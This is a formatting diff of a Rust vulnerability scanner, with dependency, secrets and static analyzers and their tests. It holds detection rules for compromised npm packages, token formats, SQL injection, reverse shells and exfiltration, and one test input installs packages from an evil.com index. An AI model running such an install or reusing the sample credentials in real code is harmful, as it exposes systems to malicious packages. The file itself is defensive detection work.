@@ -59,11 +59,15 @@ struct ShadowRule {
 pub struct DependencyAnalyzer;
 
 impl DependencyAnalyzer {
-    pub fn new() -> Self { Self }
+    pub fn new() -> Self {
+        Self
+    }
 }
 
 impl Default for DependencyAnalyzer {
-    fn default() -> Self { Self::new() }
+    fn default() -> Self {
+        Self::new()
+    }
 }
 
 struct DepRule {
@@ -87,7 +91,8 @@ const DEP_RULES: &[DepRule] = &[
     DepRule {
         pattern: r#"npm\s+install\s+--ignore-scripts\s+false"#,
         title: "NPM install with scripts enabled explicitly",
-        description: "Enabling install scripts on untrusted packages risks arbitrary code execution.",
+        description:
+            "Enabling install scripts on untrusted packages risks arbitrary code execution.",
         severity: VulnSeverity::Medium,
         cwe: Some(829),
         remediation: "Audit packages before enabling install scripts.",
@@ -95,7 +100,8 @@ const DEP_RULES: &[DepRule] = &[
     DepRule {
         pattern: r#"(event-stream|ua-parser-js|coa|rc|colors)\b.*\d+\.\d+\.\d+"#,
         title: "Previously compromised NPM package",
-        description: "This package has a known supply chain attack history. Verify the version is safe.",
+        description:
+            "This package has a known supply chain attack history. Verify the version is safe.",
         severity: VulnSeverity::High,
         cwe: Some(506),
         remediation: "Pin to a verified safe version and audit the package.",
@@ -127,8 +133,12 @@ const DEP_RULES: &[DepRule] = &[
 ];
 
 impl Analyzer for DependencyAnalyzer {
-    fn name(&self) -> &'static str { "dependency" }
-    async fn is_available(&self) -> bool { true }
+    fn name(&self) -> &'static str {
+        "dependency"
+    }
+    async fn is_available(&self) -> bool {
+        true
+    }
 
     async fn analyze(
         &self,
@@ -174,11 +184,15 @@ impl Analyzer for DependencyAnalyzer {
 pub struct SecretsAnalyzer;
 
 impl SecretsAnalyzer {
-    pub fn new() -> Self { Self }
+    pub fn new() -> Self {
+        Self
+    }
 }
 
 impl Default for SecretsAnalyzer {
-    fn default() -> Self { Self::new() }
+    fn default() -> Self {
+        Self::new()
+    }
 }
 
 struct SecretRule {
@@ -193,7 +207,8 @@ const SECRET_RULES: &[SecretRule] = &[
         pattern: r#"ghp_[0-9a-zA-Z]{36}"#,
         title: "GitHub personal access token",
         severity: VulnSeverity::Critical,
-        remediation: "Revoke the token at github.com/settings/tokens and use environment variables.",
+        remediation:
+            "Revoke the token at github.com/settings/tokens and use environment variables.",
     },
     SecretRule {
         pattern: r#"sk-[a-zA-Z0-9]{20}T3BlbkFJ[a-zA-Z0-9]{20}"#,
@@ -252,8 +267,12 @@ const SECRET_RULES: &[SecretRule] = &[
 ];
 
 impl Analyzer for SecretsAnalyzer {
-    fn name(&self) -> &'static str { "secrets" }
-    async fn is_available(&self) -> bool { true }
+    fn name(&self) -> &'static str {
+        "secrets"
+    }
+    async fn is_available(&self) -> bool {
+        true
+    }
 
     async fn analyze(
         &self,
@@ -299,7 +318,7 @@ fn redact_secret(s: &str) -> String {
     if s.len() <= 10 {
         return format!("{}***", &s[..s.len().min(4)]);
     }
-    format!("{}***{}", &s[..8], &s[s.len()-4..])
+    format!("{}***{}", &s[..8], &s[s.len() - 4..])
 }
 
 const SHADOW_RULES: &[ShadowRule] = &[
@@ -319,7 +338,8 @@ const SHADOW_RULES: &[ShadowRule] = &[
         severity: VulnSeverity::Critical,
         pattern: r#"(f"|f'|format!\(|\.format\().*(?:SELECT|INSERT|UPDATE|DELETE|DROP)"#,
         title: "SQL injection via format string",
-        description: "SQL query constructed using format strings with potentially user-controlled values.",
+        description:
+            "SQL query constructed using format strings with potentially user-controlled values.",
         cwe: Some(89),
         remediation: "Use parameterized queries.",
     },
@@ -407,7 +427,9 @@ const SHADOW_RULES: &[ShadowRule] = &[
 
 impl StaticAnalyzer {
     pub fn new() -> Self {
-        Self { _extra_rules: Vec::new() }
+        Self {
+            _extra_rules: Vec::new(),
+        }
     }
 }
 
@@ -418,8 +440,12 @@ impl Default for StaticAnalyzer {
 }
 
 impl Analyzer for StaticAnalyzer {
-    fn name(&self) -> &'static str { "static" }
-    async fn is_available(&self) -> bool { true }
+    fn name(&self) -> &'static str {
+        "static"
+    }
+    async fn is_available(&self) -> bool {
+        true
+    }
 
     async fn analyze(
         &self,
@@ -430,10 +456,7 @@ impl Analyzer for StaticAnalyzer {
 
         // Stage 1: Run embedded scanner on each code block
         for block in code_blocks {
-            let filename = format!(
-                "output.{}",
-                block.language.as_deref().unwrap_or("txt")
-            );
+            let filename = format!("output.{}", block.language.as_deref().unwrap_or("txt"));
             let scan_findings = scanner::scan_content(&filename, &block.content);
 
             for sf in scan_findings {
@@ -486,7 +509,9 @@ impl Analyzer for StaticAnalyzer {
 
         // Deduplicate
         findings.sort_by(|a, b| {
-            a.category.to_string().cmp(&b.category.to_string())
+            a.category
+                .to_string()
+                .cmp(&b.category.to_string())
                 .then(a.evidence.cmp(&b.evidence))
         });
         findings.dedup_by(|a, b| a.category == b.category && a.evidence == b.evidence);
@@ -506,7 +531,10 @@ fn map_scanner_severity(sev: scanner::Severity) -> VulnSeverity {
 fn map_scanner_category(rule_id: &str) -> VulnCategory {
     if rule_id.contains("eval") || rule_id.contains("exec") || rule_id.contains("spawn") {
         VulnCategory::CommandInjection
-    } else if rule_id.contains("keychain") || rule_id.contains("ssh") || rule_id.contains("password") {
+    } else if rule_id.contains("keychain")
+        || rule_id.contains("ssh")
+        || rule_id.contains("password")
+    {
         VulnCategory::HardcodedSecret
     } else if rule_id.contains("reverse-shell") || rule_id.contains("crypto-mining") {
         VulnCategory::DataExfiltration
@@ -514,7 +542,8 @@ fn map_scanner_category(rule_id: &str) -> VulnCategory {
         VulnCategory::PrivilegeEscalation
     } else if rule_id.contains("curl") || rule_id.contains("webhook") || rule_id.contains("dns") {
         VulnCategory::DataExfiltration
-    } else if rule_id.contains("base64") || rule_id.contains("hex") || rule_id.contains("char-code") {
+    } else if rule_id.contains("base64") || rule_id.contains("hex") || rule_id.contains("char-code")
+    {
         VulnCategory::CommandInjection
     } else {
         VulnCategory::Unknown
@@ -546,29 +575,46 @@ mod tests {
     use super::*;
 
     fn make_block(lang: &str, content: &str) -> ExtractedBlock {
-        ExtractedBlock { language: Some(lang.to_string()), content: content.to_string(), char_offset: 0 }
+        ExtractedBlock {
+            language: Some(lang.to_string()),
+            content: content.to_string(),
+            char_offset: 0,
+        }
     }
 
     #[tokio::test]
     async fn test_detects_sql_injection() {
         let analyzer = StaticAnalyzer::new();
-        let blocks = vec![make_block("python", r#"query = "SELECT * FROM users WHERE id = " + user_input"#)];
+        let blocks = vec![make_block(
+            "python",
+            r#"query = "SELECT * FROM users WHERE id = " + user_input"#,
+        )];
         let findings = analyzer.analyze("", &blocks).await.unwrap();
-        assert!(findings.iter().any(|f| f.category == VulnCategory::SqlInjection));
+        assert!(findings
+            .iter()
+            .any(|f| f.category == VulnCategory::SqlInjection));
     }
 
     #[tokio::test]
     async fn test_detects_hardcoded_password() {
         let analyzer = StaticAnalyzer::new();
-        let blocks = vec![make_block("python", r#"password = "supersecretpassword123""#)];
+        let blocks = vec![make_block(
+            "python",
+            r#"password = "supersecretpassword123""#,
+        )];
         let findings = analyzer.analyze("", &blocks).await.unwrap();
-        assert!(findings.iter().any(|f| f.category == VulnCategory::HardcodedSecret));
+        assert!(findings
+            .iter()
+            .any(|f| f.category == VulnCategory::HardcodedSecret));
     }
 
     #[tokio::test]
     async fn test_clean_code() {
         let analyzer = StaticAnalyzer::new();
-        let blocks = vec![make_block("rust", "fn greet() -> String { \"hello\".to_string() }")];
+        let blocks = vec![make_block(
+            "rust",
+            "fn greet() -> String { \"hello\".to_string() }",
+        )];
         let findings = analyzer.analyze("", &blocks).await.unwrap();
         assert!(findings.is_empty());
     }
@@ -578,7 +624,9 @@ mod tests {
         let analyzer = StaticAnalyzer::new();
         let blocks = vec![make_block("js", "element.innerHTML = userInput;")];
         let findings = analyzer.analyze("", &blocks).await.unwrap();
-        assert!(findings.iter().any(|f| f.category == VulnCategory::XssReflected));
+        assert!(findings
+            .iter()
+            .any(|f| f.category == VulnCategory::XssReflected));
     }
 
     #[tokio::test]
@@ -602,9 +650,14 @@ mod tests {
     #[tokio::test]
     async fn test_dep_detects_insecure_index() {
         let analyzer = DependencyAnalyzer::new();
-        let blocks = vec![make_block("sh", "pip install --index-url http://evil.com/simple package")];
+        let blocks = vec![make_block(
+            "sh",
+            "pip install --index-url http://evil.com/simple package",
+        )];
         let findings = analyzer.analyze("", &blocks).await.unwrap();
-        assert!(findings.iter().any(|f| f.title.contains("Insecure package index")));
+        assert!(findings
+            .iter()
+            .any(|f| f.title.contains("Insecure package index")));
     }
 
     #[tokio::test]
@@ -620,7 +673,10 @@ mod tests {
     #[tokio::test]
     async fn test_secrets_detects_github_token() {
         let analyzer = SecretsAnalyzer::new();
-        let blocks = vec![make_block("py", "token = \"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef1234\"")];
+        let blocks = vec![make_block(
+            "py",
+            "token = \"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef1234\"",
+        )];
         let findings = analyzer.analyze("", &blocks).await.unwrap();
         assert!(findings.iter().any(|f| f.title.contains("GitHub")));
         // Verify the token is redacted in evidence
@@ -641,9 +697,14 @@ mod tests {
     #[tokio::test]
     async fn test_secrets_detects_db_connection() {
         let analyzer = SecretsAnalyzer::new();
-        let blocks = vec![make_block("py", "db = \"postgresql://admin:password123@prod.db.com:5432/main\"")];
+        let blocks = vec![make_block(
+            "py",
+            "db = \"postgresql://admin:password123@prod.db.com:5432/main\"",
+        )];
         let findings = analyzer.analyze("", &blocks).await.unwrap();
-        assert!(findings.iter().any(|f| f.title.contains("Database connection")));
+        assert!(findings
+            .iter()
+            .any(|f| f.title.contains("Database connection")));
     }
 
     #[tokio::test]
@@ -656,7 +717,10 @@ mod tests {
 
     #[test]
     fn test_redact_secret() {
-        assert_eq!(redact_secret("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZab"), "ghp_ABCD***YZab");
+        assert_eq!(
+            redact_secret("ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZab"),
+            "ghp_ABCD***YZab"
+        );
         assert_eq!(redact_secret("short"), "shor***");
     }
 }
